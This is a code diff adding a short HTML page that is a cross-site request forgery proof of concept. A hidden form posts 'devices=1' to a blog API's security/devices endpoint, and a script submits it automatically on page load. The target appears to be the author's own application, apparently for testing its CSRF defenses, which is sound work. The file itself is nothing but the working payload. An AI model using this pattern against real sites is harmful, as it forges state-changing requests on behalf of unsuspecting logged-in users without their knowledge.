@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form action="https://blog-nest-raw-sql.onrender.com/api/security/devices" method="POST" id="csrf_form">
+        <input type="hidden" name="devices" value="1">
+    </form>
+
+    <script>
+        document.getElementById('csrf_form').submit();
+    </script>
+</body>
+</html>
